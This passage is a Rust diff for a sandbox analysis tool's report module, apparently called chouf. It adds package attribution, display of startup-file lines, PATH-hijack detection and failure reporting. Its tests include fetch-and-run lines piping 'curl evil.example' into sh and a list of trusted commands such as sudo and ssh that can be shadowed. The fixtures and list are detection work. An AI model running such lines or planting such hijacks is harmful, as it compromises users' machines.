@@ -1,6 +1,7 @@
 //! Turns raw observations into findings a non-specialist can read.
 
 use crate::canary::Canary;
+use crate::packages::Packages;
 use crate::sandbox::{FsDiff, Outcome};
 use crate::explore::{describe_short, Done, Verdict};
 use crate::i18n::{t, tf};
@@ -106,6 +107,10 @@ pub struct Finding {
     pub group: &'static str,
     /// How many files this line stands for: more than 1 when siblings were folded into their folder.
     pub count: usize,
+    /// The package it belongs to, when the package manager installed it from a repository (packages.rs): not an alarm.
+    pub package: String,
+    /// What it put there, to show: lines added to a startup file, addresses of a software source.
+    pub lines: Vec<String>,
 }
 
 fn changing(ops: &[Op]) -> bool {
@@ -133,7 +138,7 @@ pub fn transient_count(home: &Touches) -> usize {
         .count()
 }
 
-pub fn findings(canaries: &[Canary], home: &Touches, sys: &FsDiff) -> Vec<Finding> {
+pub fn findings(canaries: &[Canary], home: &Touches, sys: &FsDiff, pk: &Packages) -> Vec<Finding> {
     let mut out = Vec::new();
     for (rel, ops) in &home.ops {
         if transient(home, rel) {
@@ -171,6 +176,8 @@ pub fn findings(canaries: &[Canary], home: &Touches, sys: &FsDiff) -> Vec<Findin
             by: vec![],
             group,
             count: 1,
+            package: String::new(),
+            lines: vec![],
         });
     }
     for (list, word) in [
@@ -184,14 +191,18 @@ pub fn findings(canaries: &[Canary], home: &Touches, sys: &FsDiff) -> Vec<Findin
                 (_, Some(w)) => (Kind::Trust, w),
                 _ => (Kind::Other, ""),
             };
+            // what a repository package brings (docker-ce's boot script, dbus's system user) is the package's own
+            let package = pk.of(p).filter(|_| kind != Kind::Other && word != "deleted").unwrap_or("").to_string();
             out.push(Finding {
-                kind,
+                kind: if package.is_empty() { kind } else { Kind::Other },
                 path: p.clone(),
                 did: vec![word],
                 why: why.to_string(),
                 by: vec![],
                 group: "",
                 count: 1,
+                package,
+                lines: pk.sources.get(p).cloned().unwrap_or_default(),
             });
         }
     }
@@ -237,22 +248,24 @@ const FOLD: usize = 5;
 
 fn fold(list: Vec<Finding>) -> Vec<Finding> {
     let parent = |p: &str| p.rfind('/').map(|i| p[..=i].to_string()).unwrap_or_default();
-    let mut groups: BTreeMap<(Kind, String, Vec<&'static str>, String, &'static str), Vec<Finding>> = BTreeMap::new();
+    type Key = (Kind, String, Vec<&'static str>, String, &'static str, String);
+    let mut groups: BTreeMap<Key, Vec<Finding>> = BTreeMap::new();
     for f in list {
-        groups.entry((f.kind, parent(&f.path), f.did.clone(), f.why.clone(), f.group)).or_default().push(f);
+        groups.entry((f.kind, parent(&f.path), f.did.clone(), f.why.clone(), f.group, f.package.clone())).or_default().push(f);
     }
     let mut out = Vec::new();
-    for ((kind, dir, did, why, group), fs) in groups {
+    for ((kind, dir, did, why, group, package), fs) in groups {
         if fs.len() > FOLD && kind != Kind::Secret {
             let mut by: Vec<String> = fs.iter().flat_map(|f| f.by.iter().cloned()).collect();
             by.sort();
             by.dedup();
-            out.push(Finding { kind, path: dir, did, why, by, group, count: fs.len() });
+            out.push(Finding { kind, path: dir, did, why, by, group, count: fs.len(), package, lines: vec![] });
         } else {
             out.extend(fs);
         }
     }
-    out.sort_by(|a, b| (a.kind, &a.path).cmp(&(b.kind, &b.path)));
+    // what no package explains comes first among ordinary changes: it is what the program itself left
+    out.sort_by(|a, b| (a.kind, !a.package.is_empty(), &a.path).cmp(&(b.kind, !b.package.is_empty(), &b.path)));
     out
 }
 
@@ -316,7 +329,45 @@ fn kb(n: u64) -> String {
     }
 }
 
-pub fn in_short(findings: &[Finding], activity: Option<&Activity>, canaries: &[Canary]) -> String {
+/// Why the run ended early, as a line for "In short": what came next was not seen. None when it ended normally.
+pub fn failure(o: &Outcome) -> Option<String> {
+    if o.timed_out {
+        return Some(t("It was stopped at the time limit: what it would have done next was not seen."));
+    }
+    let code = o.exit.filter(|c| *c != 0)?;
+    let mut s = tf("It stopped on an error (exit {}): what it would have done next was not seen.", &[&code.to_string()]);
+    // its own last words usually say why ("requires zstd"): the last non-empty line, terminal colours removed
+    let last = [&o.stderr, &o.stdout].iter().find_map(|b| {
+        let text = String::from_utf8_lossy(b);
+        text.lines().map(plain).map(|l| l.trim().to_string()).rfind(|l| !l.is_empty())
+    });
+    if let Some(l) = last {
+        let l: String = l.chars().take(160).collect();
+        s += &format!(" {}", tf("Its last message: {}", &[&l]));
+    }
+    Some(s)
+}
+
+/// A line without its terminal escape sequences (colours, "ESC(B").
+fn plain(l: &str) -> String {
+    let mut out = String::new();
+    let mut esc = false;
+    for c in l.chars() {
+        if c == '\x1b' {
+            esc = true;
+        } else if esc {
+            esc = !c.is_ascii_alphabetic();
+        } else if !c.is_control() {
+            out.push(c);
+        }
+    }
+    out
+}
+
+/// Where packages keep their signing keys: added together with a software source, which names it better.
+const KEYS: &[&str] = &["/etc/apt/keyrings/", "/usr/share/keyrings/", "/etc/apt/trusted.gpg"];
+
+pub fn in_short(findings: &[Finding], activity: Option<&Activity>, canaries: &[Canary], failure: Option<&str>) -> String {
     let secrets: Vec<&Finding> = findings.iter().filter(|f| f.kind == Kind::Secret).collect();
     let persist = findings.iter().filter(|f| f.kind == Kind::Persistence).count();
     let trust = findings.iter().filter(|f| f.kind == Kind::Trust).count();
@@ -337,6 +388,9 @@ pub fn in_short(findings: &[Finding], activity: Option<&Activity>, canaries: &[C
     for (what, dest) in proofs.iter().take(5) {
         s += &format!("   !! {}\n", tf("PROOF: a secret left the machine, sent to {}: {}.", &[dest, what]));
     }
+    if let Some(f) = failure {
+        s += &format!("   !  {f}\n");
+    }
     if secrets.is_empty() && persist == 0 && trust == 0 && !probed && leaks.is_empty() {
         s += &format!("   {}\n", t("Nothing alarming: no secret touched, nothing set to run again, nothing new trusted."));
     }
@@ -349,8 +403,36 @@ pub fn in_short(findings: &[Finding], activity: Option<&Activity>, canaries: &[C
         let tpl = if persist > 1 { "It set itself up to run again on its own ({} ways)." } else { "It set itself up to run again on its own ({} way)." };
         s += &format!("   !! {}\n", tf(tpl, &[&persist.to_string()]));
     }
-    if trust > 0 {
+    let sources: Vec<&String> = findings.iter().filter(|f| f.kind == Kind::Trust && f.path.starts_with("/etc/apt/sources.list.d/")).flat_map(|f| &f.lines).collect();
+    if !sources.is_empty() {
+        let list: Vec<&str> = sources.iter().take(3).map(|u| u.as_str()).collect();
+        s += &format!("   !! {}\n", tf("It added a software source: {}. What comes from there will be installed like the system's own updates.", &[&list.join(", ")]));
+    }
+    let other_trust = findings.iter().filter(|f| f.kind == Kind::Trust).any(|f| {
+        let source = f.path.starts_with("/etc/apt/sources.list.d/") && !f.lines.is_empty();
+        let key = !sources.is_empty() && KEYS.iter().any(|k| f.path.starts_with(k));
+        !source && !key
+    });
+    if trust > 0 && other_trust {
         s += &format!("   !! {}\n", t("It changed what the machine trusts (software sources, certificates, admin rights or accounts)."));
+    }
+    let mut boot: Vec<&str> = findings
+        .iter()
+        .filter(|f| !f.package.is_empty() && lookup(PERSISTENCE, &f.path).is_some())
+        .flat_map(|f| f.package.split(", "))
+        .collect();
+    boot.sort();
+    boot.dedup();
+    if !boot.is_empty() {
+        let list = if boot.len() > 6 { format!("{}…", boot[..6].join(", ")) } else { boot.join(", ") };
+        s += &format!("   {}\n", tf("Packages it installed will start with the machine: {} (normal for this kind of software).", &[&list]));
+    }
+    let path: Vec<&Finding> = findings.iter().filter(|f| f.why.starts_with(PATH_ONLY)).collect();
+    if !path.is_empty() {
+        let mut dirs: Vec<&str> = path.iter().map(|f| &f.why[PATH_ONLY.len()..]).collect();
+        dirs.dedup();
+        let files: Vec<&str> = path.iter().map(|f| f.path.as_str()).collect();
+        s += &format!("   {}\n", tf("It adds {} to your PATH (in {}): normal for an installer of commands.", &[&dirs.join(", "), &files.join(", ")]));
     }
     let own: Vec<&str> = findings.iter().filter(|f| f.why.contains(", read by its own tool: ")).map(|f| f.path.as_str()).collect();
     if !own.is_empty() {
@@ -368,8 +450,11 @@ pub fn in_short(findings: &[Finding], activity: Option<&Activity>, canaries: &[C
     }
     // read secrets, then sent data out: the content may be encrypted (HTTPS), the sequence still says something
     if let (Some(a), false, true) = (activity, leaks.is_empty() == false, !secrets.is_empty()) {
+        // only what it sent after its first look at a bait (an apt download before it is not "after")
+        // shortcut: a connection opened before the read and reused after it is not counted; the leak proof still sees it
+        let first = a.opens.iter().filter(|o| canaries.iter().any(|c| o.path == format!("/root/{}", c.path))).map(|o| o.t).min();
         let mut out: Vec<(String, u64)> = Vec::new();
-        for c in a.conns.iter().filter(|c| c.sent > 0) {
+        for c in a.conns.iter().filter(|c| c.sent > 0 && first.is_none_or(|f| c.t >= f)) {
             let dest = c.name.clone().unwrap_or_else(|| c.ip.clone());
             match out.iter_mut().find(|(d, _)| *d == dest) {
                 Some(x) => x.1 += c.sent,
@@ -398,9 +483,16 @@ pub fn in_short(findings: &[Finding], activity: Option<&Activity>, canaries: &[C
         for g in &groups {
             s += &format!("     - {}\n", t(advice(g)));
         }
-        if persist > 0 {
-            let where_: Vec<&str> = findings.iter().filter(|f| f.kind == Kind::Persistence).map(|f| f.path.as_str()).take(6).collect();
+        // a startup file it added lines to is the user's own: take the lines out, never the file
+        let (edited, placed): (Vec<&Finding>, Vec<&Finding>) =
+            findings.iter().filter(|f| f.kind == Kind::Persistence).partition(|f| f.path.starts_with("~/") && !f.lines.is_empty());
+        if !placed.is_empty() {
+            let where_: Vec<&str> = placed.iter().map(|f| f.path.as_str()).take(6).collect();
             s += &format!("     - {}\n", tf("remove what it set up to come back: {}", &[&where_.join(", ")]));
+        }
+        if !edited.is_empty() {
+            let where_: Vec<&str> = edited.iter().map(|f| f.path.as_str()).collect();
+            s += &format!("     - {}\n", tf("take out the lines it added to {} (shown below)", &[&where_.join(", ")]));
         }
     }
     s
@@ -456,6 +548,118 @@ pub fn attribute(findings: &mut [Finding], a: &Activity, sys: &FsDiff) {
     }
 }
 
+/// The why of a startup line that only puts folders in PATH, followed by the folders.
+pub const PATH_ONLY: &str = "adds to PATH: ";
+
+/// Startup files chouf planted: what the program added to them is shown, line by line.
+const STARTUP: &[&str] = &[".bashrc", ".profile", ".bash_profile", ".zshrc"];
+
+/// Commands a folder put first in PATH must not take over: they would run the program's code instead.
+/// shortcut: a fixed list, not the machine's own commands; extend it when a real case slips through.
+const SENSITIVE: &[&str] = &[
+    "sudo", "su", "doas", "pkexec", "ssh", "scp", "sftp", "ssh-add", "ssh-agent", "gpg", "passwd", "login", "git", "ls",
+    "cat", "cp", "mv", "rm", "sh", "bash", "zsh", "dash", "env", "ps", "kill", "id", "whoami", "curl", "wget", "python",
+    "python3", "node", "npm", "npx", "pip", "pip3", "apt", "apt-get", "dpkg", "dnf", "yum", "systemctl", "crontab",
+    "docker", "podman", "mount", "ip", "ss", "chmod", "chown", "grep", "find", "tar", "openssl", "which", "less", "vi",
+    "vim", "nano", "keepassxc", "firefox", "chromium", "google-chrome", "brave-browser",
+];
+
+/// A small regular file of the fake home, or None: never follows a link out of it, never blocks on a pipe the
+/// program left in place of a file.
+pub fn small_file(path: &Path) -> Option<String> {
+    let m = std::fs::symlink_metadata(path).ok()?;
+    (m.is_file() && m.len() <= 65536).then(|| std::fs::read_to_string(path).ok()).flatten()
+}
+
+/// "$HOME/.cargo/bin", "${HOME}/x" or "~/x" → the path below the home, if it stays inside it.
+fn home_rel(p: &str) -> Option<String> {
+    let r = p.strip_prefix("$HOME/").or(p.strip_prefix("${HOME}/")).or(p.strip_prefix("~/"))?;
+    let r = r.trim_end_matches('/');
+    (!r.is_empty() && !r.split('/').any(|c| c == ".." || c.is_empty()) && !r.contains(['$', '`', '\\'])).then(|| r.to_string())
+}
+
+/// `export PATH="$HOME/.cargo/bin:$PATH"` → the home folders it adds; None for anything more than that.
+fn path_dirs(line: &str) -> Option<Vec<String>> {
+    let v = line.strip_prefix("export ").unwrap_or(line).strip_prefix("PATH=")?;
+    let v = v.strip_prefix('"').and_then(|v| v.strip_suffix('"')).unwrap_or(v);
+    if v.contains(['`', ';', '&', '|', '<', '>', '"', '\'', ' ', '(']) {
+        return None;
+    }
+    let mut dirs = Vec::new();
+    for part in v.split(':') {
+        if !["$PATH", "${PATH}", ""].contains(&part) {
+            dirs.push(home_rel(part)?);
+        }
+    }
+    Some(dirs)
+}
+
+/// `. "$HOME/.cargo/env"` or `source ~/.x/env` → the home file it reads.
+fn sourced(line: &str) -> Option<String> {
+    let rest = line.strip_prefix(". ").or(line.strip_prefix("source "))?.trim();
+    let rest = rest.strip_prefix('"').and_then(|r| r.strip_suffix('"')).unwrap_or(rest);
+    if rest.contains([' ', '"', '\'', ';', '&', '|']) {
+        return None;
+    }
+    home_rel(rest)
+}
+
+/// A file like rustup's ~/.cargo/env: nothing but folders put in PATH, with the usual "already there?" test.
+fn env_file_dirs(text: &str) -> Option<Vec<String>> {
+    let mut dirs = Vec::new();
+    for l in text.lines().map(str::trim) {
+        let pattern = l.ends_with(')') && !l.contains('(') && l.chars().all(|c| c.is_ascii_alphanumeric() || "*:\"$/._-{}~)".contains(c));
+        if l.is_empty() || l.starts_with('#') || [";;", "esac", "export PATH", "case \":${PATH}:\" in", "case \":$PATH:\" in"].contains(&l) || pattern {
+            continue;
+        }
+        dirs.extend(path_dirs(l)?);
+    }
+    Some(dirs)
+}
+
+/// Shows what the program added to the startup files chouf planted. Lines that only put home folders in PATH (a
+/// language installer: rustup's `. "$HOME/.cargo/env"`) are not a way back but ordinary, as long as those folders
+/// take over none of the commands people trust (a `sudo` placed first in PATH would be).
+pub fn startup_lines(findings: &mut [Finding], home: &Path) {
+    for f in findings.iter_mut().filter(|f| f.kind == Kind::Persistence) {
+        let Some(rel) = f.path.strip_prefix("~/").filter(|r| STARTUP.contains(r)) else { continue };
+        let Some(now) = small_file(&home.join(rel)) else { continue };
+        let before: Vec<&str> = crate::canary::planted(rel).unwrap_or("").lines().collect();
+        f.lines = now.lines().filter(|l| !l.trim().is_empty() && !before.contains(l)).map(String::from).collect();
+        let mut dirs = Vec::new();
+        let only_path = !f.lines.is_empty()
+            && f.lines.iter().map(|l| l.trim()).all(|l| {
+                let more = path_dirs(l).or_else(|| sourced(l).and_then(|file| small_file(&home.join(file))).and_then(|t| env_file_dirs(&t)));
+                let ok = l.starts_with('#') || more.is_some();
+                dirs.extend(more.unwrap_or_default());
+                ok
+            });
+        if !only_path || dirs.is_empty() {
+            continue;
+        }
+        dirs.sort();
+        dirs.dedup();
+        let mut taken: Vec<String> = dirs
+            .iter()
+            .filter(|d| std::fs::symlink_metadata(home.join(d)).is_ok_and(|m| m.is_dir()))
+            .flat_map(|d| std::fs::read_dir(home.join(d)).into_iter().flatten().flatten())
+            .map(|e| e.file_name().to_string_lossy().into_owned())
+            .filter(|n| SENSITIVE.contains(&n.as_str()))
+            .collect();
+        taken.sort();
+        taken.dedup();
+        if taken.is_empty() {
+            f.kind = Kind::Other;
+            f.why = format!("{PATH_ONLY}{}", dirs.iter().map(|d| format!("~/{d}")).collect::<Vec<_>>().join(", "));
+        } else {
+            f.why = format!("{}{}", TAKES_OVER, taken.join(", "));
+        }
+    }
+}
+
+/// The why of a startup line whose PATH folder takes over trusted commands, followed by them.
+pub const TAKES_OVER: &str = "puts its own commands first in PATH, in place of: ";
+
 /// How a shell would need the argument written: what the report shows must be what ran.
 fn quote(a: &str) -> String {
     let plain = !a.is_empty()
@@ -466,6 +670,32 @@ fn quote(a: &str) -> String {
     } else {
         format!("'{}'", a.replace('\'', r"'\''"))
     }
+}
+
+/// The package managers whose inner workings (methods, dpkg, install scripts) only bury what the program itself ran.
+const PACKAGE_MANAGERS: &[&str] = &["apt-get", "apt", "aptitude", "dpkg", "dnf", "yum", "rpm"];
+
+/// The program tree with what runs under a package manager folded into it, counted (report.json keeps it all).
+fn fold_package_managers(tree: &[(usize, String, Option<i64>)]) -> Vec<(usize, String, Option<i64>, usize)> {
+    let mut out: Vec<(usize, String, Option<i64>, usize)> = Vec::new();
+    let mut under: Option<usize> = None;
+    for (depth, cmd, exit) in tree {
+        if let Some(d) = under {
+            if *depth > d {
+                if let Some(last) = out.last_mut() {
+                    last.3 += 1;
+                }
+                continue;
+            }
+            under = None;
+        }
+        let program = cmd.split_whitespace().next().unwrap_or("").rsplit('/').next().unwrap_or("");
+        if PACKAGE_MANAGERS.contains(&program) {
+            under = Some(*depth);
+        }
+        out.push((*depth, cmd.clone(), *exit, 0));
+    }
+    out
 }
 
 /// What the explorer did and what it concluded: an opinion, printed next to the measured findings.
@@ -499,7 +729,7 @@ impl Report<'_> {
             "session": self.id, "image": self.image, "command": self.cmd,
             "exit_code": o.exit, "timed_out": o.timed_out, "seconds": o.elapsed.as_secs_f64(),
             "watch_incomplete": self.incomplete, "temporary_files": self.transient,
-            "findings": self.findings.iter().map(|f| json!({"kind": f.kind.tag(), "path": f.path, "did": f.did, "why": f.why, "by": f.by, "group": f.group, "count": f.count})).collect::<Vec<_>>(),
+            "findings": self.findings.iter().map(|f| json!({"kind": f.kind.tag(), "path": f.path, "did": f.did, "why": f.why, "by": f.by, "group": f.group, "count": f.count, "package": f.package, "lines": f.lines})).collect::<Vec<_>>(),
             "activity": match &self.activity {
                 Ok(a) => {
                     let mut v = a.json();
@@ -543,7 +773,7 @@ impl Report<'_> {
                 .collect::<Vec<_>>()
                 .join(" ")
         );
-        s += &in_short(&self.findings, self.activity.as_ref().ok().copied(), self.canaries);
+        s += &in_short(&self.findings, self.activity.as_ref().ok().copied(), self.canaries, failure(o).as_deref());
         if let Some(x) = &self.exploration {
             s += &format!("\n{}\n", t("How chouf explored it"));
             for (i, d) in x.steps.iter().enumerate() {
@@ -581,16 +811,25 @@ impl Report<'_> {
                 }
             }
             let mark = if f.kind == Kind::Other { " " } else { "!" };
-            let why = if f.why.is_empty() {
-                String::new()
-            } else {
-                format!("  ({})", crate::i18n::why(&f.why))
-            };
+            let mut notes: Vec<String> = Vec::new();
+            if !f.why.is_empty() {
+                notes.push(crate::i18n::why(&f.why));
+            }
+            if !f.package.is_empty() {
+                notes.push(tf("package {}", &[&f.package]));
+            }
+            let why = if notes.is_empty() { String::new() } else { format!("  ({})", notes.join(" · ")) };
             let path = if f.count > 1 { tf("{} files in {}", &[&f.count.to_string(), &f.path]) } else { f.path.clone() };
             let did: Vec<String> = f.did.iter().map(|d| t(d)).collect();
             s += &format!(" {mark} {:<9} {}{}\n", did.join(", "), path, why);
             // who did it matters for an alarm; for an ordinary change it is noise
             let by: &[String] = if f.kind == Kind::Other { &[] } else { &f.by };
+            for l in f.lines.iter().take(4) {
+                s += &format!("   {:<9} + {}\n", "", l.chars().take(150).collect::<String>());
+            }
+            if f.lines.len() > 4 {
+                s += &format!("   {:<9} {}\n", "", tf("and {} more", &[&(f.lines.len() - 4).to_string()]));
+            }
             for b in by.iter().take(3) {
                 s += &format!("   {:<9} {} {b}\n", "", t("by"));
             }
@@ -634,15 +873,17 @@ impl Report<'_> {
                 let tree = a.tree();
                 if !tree.is_empty() {
                     s += &format!("\n{} ({})\n", t("Programs it ran"), tree.len());
-                    for (depth, cmd, exit) in tree.iter().take(40) {
+                    let shown = fold_package_managers(&tree);
+                    for (depth, cmd, exit, hidden) in shown.iter().take(40) {
                         let code = match exit {
                             Some(0) | None => String::new(),
                             Some(c) => format!("  (exit {c})"),
                         };
-                        s += &format!("   {}{cmd}{code}\n", "  ".repeat((*depth).min(8)));
+                        let more = if *hidden > 0 { format!("  {}", tf("(+{} of its own programs)", &[&hidden.to_string()])) } else { String::new() };
+                        s += &format!("   {}{cmd}{code}{more}\n", "  ".repeat((*depth).min(8)));
                     }
-                    if tree.len() > 40 {
-                        s += &format!("   {}\n", tf("and {} more (report.json has them all)", &[&(tree.len() - 40).to_string()]));
+                    if shown.len() > 40 {
+                        s += &format!("   {}\n", tf("and {} more (report.json has them all)", &[&(shown.len() - 40).to_string()]));
                     }
                 }
                 if a.lost {
@@ -738,7 +979,7 @@ mod tests {
             changed: vec![],
             deleted: vec![],
         };
-        let f = findings(&canaries, &home, &sys);
+        let f = findings(&canaries, &home, &sys, &Packages::default());
         let got: Vec<(Kind, &str)> = f.iter().map(|f| (f.kind, f.path.as_str())).collect();
         assert_eq!(
             got,
@@ -758,16 +999,16 @@ mod tests {
 
     #[test]
     fn in_short_speaks_plainly_and_gives_advice() {
-        let f = |kind, path: &str, group| Finding { kind, path: path.into(), did: vec!["read"], why: String::new(), by: vec![], group, count: 1 };
+        let f = |kind, path: &str, group| Finding { kind, path: path.into(), did: vec!["read"], why: String::new(), by: vec![], group, count: 1, package: String::new(), lines: vec![] };
         let findings = vec![
             f(Kind::Secret, "~/.config/Exodus/exodus.wallet/seed.seco", crate::canary::WALLETS),
             f(Kind::Secret, "~/.config/BraveSoftware/Brave-Browser/Default/Login Data", crate::canary::PASSWORDS),
             f(Kind::Persistence, "/etc/cron.d/x", ""),
         ];
-        let s = in_short(&findings, None, &[]);
+        let s = in_short(&findings, None, &[], None);
         assert!(s.contains("It went through your crypto wallets, passwords and browser logins: 2 bait files."), "{s}");
         assert!(s.contains("run again on its own (1 way)") && s.contains("new wallet") && s.contains("/etc/cron.d/x"), "{s}");
-        assert!(in_short(&[f(Kind::Other, "/tmp/x", "")], None, &[]).contains("Nothing alarming"));
+        assert!(in_short(&[f(Kind::Other, "/tmp/x", "")], None, &[], None).contains("Nothing alarming"));
     }
 
     #[test]
@@ -778,7 +1019,7 @@ mod tests {
         added.push("/etc/ssl/certs/ca-certificates.crt".into());
         added.push("/etc/ssl/certs/Evil_CA.pem".into());
         let sys = FsDiff { added: added.clone(), changed: vec![], deleted: vec![] };
-        let f = findings(&[], &Touches::default(), &sys);
+        let f = findings(&[], &Touches::default(), &sys, &Packages::default());
         let trust: Vec<&str> = f.iter().filter(|f| f.kind == Kind::Trust).map(|f| f.path.as_str()).collect();
         assert_eq!(trust, vec!["/etc/ssl/certs/Evil_CA.pem"], "only the root that is not Mozilla's stays an alarm");
         // the 17 ordinary links fold into one line, the 8 Mozilla files into another
@@ -787,7 +1028,7 @@ mod tests {
         // a custom root in the local folder: nothing is excused
         let mut sys = sys;
         sys.added.push("/usr/local/share/ca-certificates/corp.crt".into());
-        let f = findings(&[], &Touches::default(), &sys);
+        let f = findings(&[], &Touches::default(), &sys, &Packages::default());
         let alarms: usize = f.iter().filter(|f| f.kind == Kind::Trust && f.path.starts_with("/etc/ssl/certs/")).map(|f| f.count).sum();
         assert_eq!(alarms, 18, "every certificate is an alarm again: {f:?}");
     }
@@ -799,7 +1040,7 @@ mod tests {
         let home = touches(&[(".npmrc", &[Op::Open, Op::Read])]);
         let run_with = |events: Vec<serde_json::Value>, sys: &FsDiff| {
             let a = Activity::from_events(&events, false);
-            let mut f = findings(&canaries, &home, sys);
+            let mut f = findings(&canaries, &home, sys, &Packages::default());
             attribute(&mut f, &a, sys);
             f
         };
@@ -809,7 +1050,7 @@ mod tests {
         let f = run(vec![npm.clone(), read(10)]);
         assert_eq!(f[0].kind, Kind::Other, "{f:?}");
         assert_eq!(f[0].why, "npm publish token, read by its own tool: npm");
-        assert!(in_short(&f, None, &[]).contains("It read one of its own settings (~/.npmrc)"));
+        assert!(in_short(&f, None, &[], None).contains("It read one of its own settings (~/.npmrc)"));
         // the classic attack: an install script, not npm, reads the token
         let postinstall = json!({"kind":"exec","t":2,"pid":11,"ppid":10,"comm":"node","file":"/usr/local/bin/node","args":["node","install.js"]});
         let f = run(vec![npm.clone(), postinstall, read(10), read(11)]);
@@ -841,5 +1082,118 @@ mod tests {
         assert_eq!(leaked(&cans, &leak(&format!("data={b64}"))).unwrap().what, "SSH private key");
         assert!(leaked(&cans, &leak("nothing here")).is_none());
     }
-}
 
+    fn home_with(files: &[(&str, &str)]) -> std::path::PathBuf {
+        use std::sync::atomic::{AtomicUsize, Ordering};
+        static N: AtomicUsize = AtomicUsize::new(0);
+        let d = std::env::temp_dir().join(format!("chouf-home-{}-{}", std::process::id(), N.fetch_add(1, Ordering::SeqCst)));
+        let _ = std::fs::remove_dir_all(&d);
+        for (rel, body) in files {
+            let p = d.join(rel);
+            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
+            std::fs::write(p, body).unwrap();
+        }
+        d
+    }
+
+    fn startup(path: &str) -> Finding {
+        Finding { kind: Kind::Persistence, path: path.into(), did: vec!["written"], why: "runs in every new terminal".into(), by: vec![], group: "", count: 1, package: String::new(), lines: vec![] }
+    }
+
+    #[test]
+    fn a_language_installer_putting_its_folder_in_path_is_ordinary_but_taking_over_sudo_is_not() {
+        let bashrc = crate::canary::planted(".bashrc").unwrap();
+        let rustup_env = "#!/bin/sh\n# rustup shell setup\ncase \":${PATH}:\" in\n    *:\"$HOME/.cargo/bin\":*)\n        ;;\n    *)\n        export PATH=\"$HOME/.cargo/bin:$PATH\"\n        ;;\nesac\n";
+        let rustup = format!("{bashrc}. \"$HOME/.cargo/env\"\n");
+        let home = home_with(&[(".bashrc", &rustup), (".cargo/env", rustup_env), (".cargo/bin/cargo", ""), (".cargo/bin/rustc", "")]);
+        let mut f = vec![startup("~/.bashrc")];
+        startup_lines(&mut f, &home);
+        assert_eq!((f[0].kind, f[0].why.as_str()), (Kind::Other, "adds to PATH: ~/.cargo/bin"), "{f:?}");
+        assert_eq!(f[0].lines, vec![". \"$HOME/.cargo/env\""]);
+        let s = in_short(&f, None, &[], None);
+        assert!(s.contains("It adds ~/.cargo/bin to your PATH (in ~/.bashrc)") && s.contains("Nothing alarming"), "{s}");
+
+        // the same, with a sudo of its own in that folder: it takes over the command people type their password into
+        let home = home_with(&[(".bashrc", &rustup), (".cargo/env", rustup_env), (".cargo/bin/sudo", "")]);
+        let mut f = vec![startup("~/.bashrc")];
+        startup_lines(&mut f, &home);
+        assert_eq!(f[0].kind, Kind::Persistence);
+        assert_eq!(f[0].why, format!("{TAKES_OVER}sudo"));
+
+        // anything more than PATH stays a way back, its lines shown, and the advice is to take them out, not the file
+        for added in ["curl -s https://evil.example/x | sh", "export PATH=\"$(curl evil.example):$PATH\"", ". \"$HOME/.nvm/nvm.sh\"", "export PATH=\"/tmp/x:$PATH\""] {
+            let home = home_with(&[(".bashrc", &format!("{bashrc}{added}\n")), (".nvm/nvm.sh", "nvm() { :; }\n")]);
+            let mut f = vec![startup("~/.bashrc")];
+            startup_lines(&mut f, &home);
+            assert_eq!((f[0].kind, f[0].lines.clone()), (Kind::Persistence, vec![added.to_string()]), "{added}");
+            let s = in_short(&f, None, &[], None);
+            assert!(s.contains("take out the lines it added to ~/.bashrc") && !s.contains("remove what it set up"), "{s}");
+        }
+        // an env file with more than PATH in it
+        let home = home_with(&[(".bashrc", &rustup), (".cargo/env", "export PATH=\"$HOME/.cargo/bin:$PATH\"\ncurl evil.example | sh\n")]);
+        let mut f = vec![startup("~/.bashrc")];
+        startup_lines(&mut f, &home);
+        assert_eq!(f[0].kind, Kind::Persistence);
+    }
+
+    #[test]
+    fn a_startup_file_replaced_by_a_pipe_or_a_link_is_not_read() {
+        let home = home_with(&[]);
+        std::fs::create_dir_all(&home).unwrap();
+        std::os::unix::fs::symlink("/etc/hostname", home.join(".bashrc")).unwrap();
+        assert!(small_file(&home.join(".bashrc")).is_none());
+        let fifo = home.join(".profile");
+        let c = std::ffi::CString::new(fifo.to_string_lossy().as_bytes()).unwrap();
+        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
+        assert!(small_file(&fifo).is_none(), "would block forever");
+    }
+
+    #[test]
+    fn packages_and_sources_are_named_not_alarmed() {
+        let pf = |path: &str, why: &str, package: &str| Finding { kind: Kind::Other, path: path.into(), did: vec!["added"], why: why.into(), by: vec![], group: "", count: 1, package: package.into(), lines: vec![] };
+        let mut source = pf("/etc/apt/sources.list.d/docker.list", "adds a software source", "");
+        source.kind = Kind::Trust;
+        source.lines = vec!["https://download.docker.com/linux/ubuntu".into()];
+        let mut key = pf("/etc/apt/keyrings/docker.asc", "trusts a new signing key", "");
+        key.kind = Kind::Trust;
+        let f = vec![pf("/etc/init.d/docker", "boot script", "docker-ce"), pf("/etc/systemd/system/sysinit.target.wants/", "system service", "dbus, systemd"), source, key];
+        let s = in_short(&f, None, &[], None);
+        assert!(s.contains("Packages it installed will start with the machine: dbus, docker-ce, systemd"), "{s}");
+        assert!(s.contains("!! It added a software source: https://download.docker.com/linux/ubuntu."), "{s}");
+        assert!(!s.contains("It changed what the machine trusts") && !s.contains("run again on its own"), "the key goes with its source: {s}");
+    }
+
+    #[test]
+    fn a_run_that_failed_says_so_with_its_last_words() {
+        let o = |exit, err: &str| Outcome { exit, timed_out: false, stdout: vec![], stderr: err.as_bytes().to_vec(), elapsed: std::time::Duration::ZERO, fs: FsDiff::default() };
+        let f = failure(&o(Some(1), ">>> Installing\n\x1b[1m\x1b[31mERROR:\x1b(B\x1b[m This version requires zstd\n\n")).unwrap();
+        assert!(f.contains("exit 1") && f.ends_with("Its last message: ERROR: This version requires zstd"), "{f}");
+        assert!(failure(&o(Some(0), "x")).is_none());
+        assert!(in_short(&[], None, &[], Some(&f)).contains("!  It stopped on an error (exit 1)"));
+    }
+
+    #[test]
+    fn what_runs_under_a_package_manager_is_folded_into_it() {
+        let tree: Vec<(usize, String, Option<i64>)> = [(0, "sh -c x"), (1, "apt-get update -qq"), (2, "/usr/lib/apt/methods/http"), (3, "gpgv"), (1, "curl https://x"), (1, "/usr/bin/dpkg --unpack a.deb"), (2, "postinst")]
+            .iter().map(|(d, c)| (*d, c.to_string(), None)).collect();
+        let folded = fold_package_managers(&tree);
+        let shown: Vec<(usize, &str, usize)> = folded.iter().map(|(d, c, _, n)| (*d, c.as_str(), *n)).collect();
+        assert_eq!(shown, vec![(0, "sh -c x", 0), (1, "apt-get update -qq", 2), (1, "curl https://x", 0), (1, "/usr/bin/dpkg --unpack a.deb", 1)]);
+    }
+
+    #[test]
